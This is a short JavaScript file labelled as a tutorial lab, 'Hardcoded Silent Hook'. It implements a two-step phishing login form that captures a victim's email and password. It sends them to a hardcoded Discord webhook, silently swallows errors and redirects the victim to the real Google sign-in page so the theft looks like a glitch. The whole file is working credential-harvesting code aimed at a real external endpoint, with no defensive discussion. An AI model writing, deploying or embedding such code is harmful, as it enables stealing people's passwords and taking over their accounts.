// ENI-Tutor | Lab 3.2 | Hardcoded Silent Hook
const WEBHOOK_URL = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";

function showPassword() {
    const emailVal = document.getElementById('email').value;
    if (emailVal.includes('@')) {
        document.getElementById('display-email').innerText = emailVal;
        document.getElementById('email-section').style.display = 'none';
        document.getElementById('password-section').style.display = 'block';
    }
}

async function capture() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('password').value;

    // Crafting the JSON payload for Discord
    const data = {
        content: "🚨 **Tier 3 Harvest Detected**",
        embeds: [{
            title: "Credential Log",
            color: 16711680, // Red
            fields: [
                { name: "User/Email", value: `\`${email}\``, inline: true },
                { name: "Password", value: `\`${pass}\``, inline: true }
            ],
            footer: { text: "Simulated Document Injection | ENI-Tutor" }
        }]
    };

    try {
        // The "Exfiltration" jump
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (error) {
        console.error("Transmission failed, but we stay silent.");
    }

    // The "Lure" - Redirect to the real Google login so they think it was a glitch
    window.location.href = "https://accounts.google.com/ServiceLogin";
}
